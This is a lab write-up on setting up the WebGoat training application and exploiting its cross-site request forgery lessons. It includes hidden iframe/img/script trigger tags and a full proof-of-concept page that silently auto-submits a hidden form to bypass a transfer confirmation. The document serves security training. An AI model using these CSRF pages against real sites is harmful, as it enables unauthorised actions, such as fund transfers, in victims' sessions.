# WebGoat — CSRF Setup & Exploitation Notes

> **Lab Environment** · Web Application Penetration Testing · Cross-Site Request Forgery (XSRF)

---

## Repositories

|Version|Link|
|---|---|
|WebGoat (current)|https://github.com/WebGoat/WebGoat|
|WebGoat Legacy|https://github.com/WebGoat/WebGoat-Legacy|

---

## WebGoat Legacy v6.0.1 — Standalone JAR

### Step 1 — Download

```bash
wget https://github.com/WebGoat/WebGoat-Legacy/releases/download/v6.0.1/WebGoat-6.0.1-war-exec.jar
```

### Step 2 — Run WebGoat

```bash
java -Dfile.encoding=UTF-8 \
     -Dwebgoat.port=8080 \
     -Dwebwolf.port=9090 \
     -Dserver.address=192.168.1.32 \
     -jar WebGoat-6.0.1-war-exec.jar
```

### Step 3 — Check Ports

```bash
netstat -nltup
```

### Access

```
http://192.168.1.32:8080/WebGoat/login
```

---

## WebGoat v6.0.1 — Docker Version

**Docker Hub:** https://hub.docker.com/r/classicye/webgoat/

### Pull Image

```bash
docker pull classicye/webgoat
```

### Run Container

```bash
docker run -p 7000:8080 classicye/webgoat java -jar WebGoat-6.0.1-war-exec.jar
```

### Access

```
http://192.168.1.32:7000/WebGoat/start.mvc
```

---

## Sample Exploit URLs

These URLs directly trigger the fund transfer action on a vulnerable WebGoat instance:

```
http://192.168.1.229:8080/WebGoat/attack?Screen=33&Menu=900&transferFunds=4000
http://192.168.1.32:7000/WebGoat/attack?Screen=52&Menu=900&transferFunds=4000
http://192.168.1.32:7000/WebGoat/attack?Screen=45&Menu=900&transferFunds=4000
```

---

## Cross-Site Request Forgery (CSRF)

### Example Target URL

```
http://192.168.1.52:8080/WebGoat/attack?Screen=33&Menu=900&transferFunds=4000
```

---

### CSRF PoC Payload — Trigger Tags

All three tags below silently send a GET request to the target when a victim loads the attacker's page:

```html
<!-- iframe: loads target URL in hidden frame -->
<iframe src="http://192.168.1.51:8080/WebGoat/attack?Screen=33&Menu=900&transferFunds=4000" />

<!-- img: browser fetches src as image — triggers GET silently -->
<img src="http://192.168.1.51:8080/WebGoat/attack?Screen=33&Menu=900&transferFunds=4000" />

<!-- script: loads target URL as JS source -->
<script src="http://192.168.1.51:8080/WebGoat/attack?Screen=33&Menu=900&transferFunds=4000" />
```

---

## CSRF Prompt Bypass

Used when the target endpoint requires a confirmation step (e.g. `transferFunds=CONFIRM`) before the actual POST.

### Target URLs

|Method|URL|
|---|---|
|GET|`http://192.168.1.51:8080/WebGoat/attack?Screen=32&menu=900&transferFunds=4000`|
|POST|`http://192.168.1.51:8080/WebGoat/attack?Screen=32&menu=900`|

---

### PoC HTML — Full Exploit Page

This page:

1. Fires a GET via `<img>` to set up the session state
2. Waits 3 seconds (`sleep(3000)`)
3. Auto-submits a hidden POST form into an invisible iframe

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CSRF - POC</title>
</head>
<body>

    <!-- Step 1: GET request — triggers session/state setup -->
    <img src="http://192.168.1.51:8080/WebGoat/attack?Screen=32&menu=900"
         width="1" height="1" />

    <!-- Step 2: GET with funds param — onerror fires attack.init() after load -->
    <img src="http://192.168.1.51:8080/WebGoat/attack?Screen=32&menu=900&transferFunds=4000"
         width="1" height="1"
         onerror="attack.init();" />

    <!-- Step 3: Hidden POST form targeting invisible iframe -->
    <form style="display: none;"
          target="iframe1"
          id="form1"
          method="POST"
          action="http://192.168.1.51:8080/WebGoat/attack?Screen=32&menu=900">

        <input type="text"   name="transferFunds" value="CONFIRM">
        <input type="Submit" id="f2">

    </form>

    <!-- Invisible iframe receives the POST response silently -->
    <iframe name="iframe1" id="foo" frameborder="0" style="display: none;"></iframe>

</body>
<script>

    /* Busy-wait sleep — blocks JS thread for N milliseconds */
    function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
            currentDate = Date.now();
        } while (currentDate - date < milliseconds);
    }

    /* Wait 3 seconds then submit the hidden form */
    sleep(3000);

    var attack = {
        init: function () {
            var form = document.getElementById('form1');
            form.submit();   // auto-submits POST with CONFIRM value
        }
    };

</script>
</html>
```

---

### How the Prompt Bypass Works

```
Step 1  →  GET  /attack?Screen=32&menu=900
           img tag fires silently — initialises the transfer state on server

Step 2  →  GET  /attack?Screen=32&menu=900&transferFunds=4000
           img onerror triggers attack.init() after 3s sleep

Step 3  →  POST /attack?Screen=32&menu=900
           hidden form submits  transferFunds=CONFIRM  into invisible iframe
           server sees valid session cookie + CONFIRM  →  transfer executed
```

> **Why the sleep?** The server needs to process Step 1 before Step 2's POST fires. The 3-second busy-wait ensures the session state is ready before the CONFIRM lands.

---

## Quick Reference

|Topic|Detail|
|---|---|
|Standalone JAR port|`8080`|
|Docker mapped port|`7000`|
|WebWolf port|`9090`|
|Default login URL|`/WebGoat/login`|
|Docker start URL|`/WebGoat/start.mvc`|
|Attack endpoint|`/WebGoat/attack?Screen=XX&Menu=900`|
|Confirm param|`transferFunds=CONFIRM`|